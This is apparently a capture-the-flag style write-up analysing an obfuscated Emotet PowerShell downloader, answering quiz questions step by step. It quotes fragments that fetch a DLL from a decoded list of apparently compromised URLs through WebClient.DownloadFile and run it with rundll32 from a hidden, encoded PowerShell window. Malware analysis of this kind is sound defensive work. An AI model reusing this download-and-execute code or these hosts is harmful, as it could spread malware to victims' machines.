#### Maliciou PowerShell Analysis

> file : ps_script.ps

Using CyberChef, 

#### Questions

First, we see `POwersheLL -w hidden -ENCOD`. PowerShell accepts case-insensitive input, so we can ignore .

`POwersheLL -w hidden`means that a hidden PowerShell window (invisible to the user) is opened, and `-ENCOD,`shorthand for `encoded` shows that the script was encoded with Base64.

The first thing to do is recognise that the PowerShell payload is `base64` encoded. We can overcome this hurdle easily with **From Base64** in CyberChef. I like to use **Regular Expression** to extract the encoded string.

##### 1) What security protocol is being used for the communication with a malicious domain?

```
"sEcuRITYproT`o`c`ol" = ('T'+('ls'+'12'));
```

**Answer:**  TLS 1.2

##### 2) What directory does the obfuscated PowerShell create? (Starting from \HOME\) 

```
"c`REAt`edI`REC`TORy"($HOME + (('{'+'0}Db_bh'+'30'+'{0}'+'Yf'+'5be5g{0}')-F [chAR]92))

ps > echo (('{'+'0}Db_bh'+'30'+'{0}'+'Yf'+'5be5g{0}') -F [chAR]92))
   > \Db_bh30\Yf5be5g
```

**Answer:** \HOME\Db_bh30\Yf5be5g\

##### 3) What file is being downloaded (full name)?

```
foreach ($Bm5pw6z in $B9fhbyv){try{(&('New'+'-Objec'+'t') SysTem.nEt.WEBcLIeNT)."do`WNl`OaD`FIlE"($Bm5pw6z, $Imd1yck)
: Downloaded file is $Imd1yck

$Imd1yck=$HOME+((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG][chAr]92))+$Swrp6tc+(('.'+'dl')+'l')

PS > echo ((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG][chAr]92))+$Swrp6tc+(('.'+'dl')+'l')
: \Db_bh30\Yf5be5g\ + $Swrp6tc + .dll

$Swrp6tc = (('A6'+'9')+'S')
: A69S
```

**Answer:** A69S.dll

##### 4) What is used to execute the downloaded file?

```
If ((&('Ge'+'t-It'+'em') $Imd1yck)."len`G`TH" -ge 35698) {&('r'+'undl'+'l32') $Imd1yck,(('Co'+'nt')+'r'+('ol'+'_RunD'+'L')+'L')."T`OSt`RiNG"()\n$R65I=('Z'+('09'+'B'))
```

**Answer:** rundll32

##### 5) What is the domain name of the URI ending in ‘/6F2gd/’ 

```
$B9fhbyv=(']'+('a'+'nw[3s://adm'+'int'+'k.c'+'o'+'m/'+'w')+('p-adm'+'in/'+'L/')+'@'+(']a'+'n'+'w[3s')+':'+'/'+'/m'+('ike'+'ge')+('e'+'r'+'inck.')+('c'+'om')+('/c/'+'Y'+'Ys')+'a'+('/@]'+'anw'+'['+'3://free'+'lanc'+'e'+'rw')+('ebdesi'+'gnerh'+'yd')+('er'+'aba')+('d.'+'com/')+('cgi'+'-bin'+'/S')+('/'+'@'+']anw')+('[3'+'://'+'etdog.co'+'m'+'/w')+('p-'+'co')+'nt'+('e'+'nt')+('/n'+'u/@')+(']a'+'nw[3')+'s'+('://'+'www'+'.hintu'+'p.c')+('o'+'m.')+('b'+'r/')+'w'+('p'+'-co')+('n'+'ten')+('t'+'/dE/'+'@]a'+'nw[3://'+'www.')+'s'+('tm'+'arouns'+'.')+('ns'+'w')+('.'+'edu.au/p'+'a'+'y'+'pal/b8')+('G'+'/@]')+('a'+'nw[')+('3:'+'/')+('/'+'wm.mcdeve'+'lop.net'+'/'+'c'+'on'+'t'+'e')+('nt'+'/')+'6'+('F2'+'gd/'))."RE`p`lACe"(((']a'+'n')+('w'+'[3')),([array]('sd','sw'),(('h'+'tt')+'p'),'3d')[1])."s`PLIT"($C83R + $Cvmmq4o + $F10Q)

PS > echo $$B9fhbyv
https://admintk.com/wp-admin/L/@https://mikegeerinck.com/c/YYsa/@http://freelancerwebdesignerhyderabad.com/cgi-bin/S/@http://etdog.com/wp-content/nu/@https://www.hintup.com.br/wp-content/dE/@http://www.stmarouns.nsw.edu.au/paypal/b8G/@http://wm.mcdevelop.net/content/6F2gd/
```

**Answer:** wm.mcdevelop.net

##### 6) Based on the analysis of the obfuscated code, what is the name of the malware? 

```
search in google > wm.mcdevelop.net
```

**Answer:** emotet
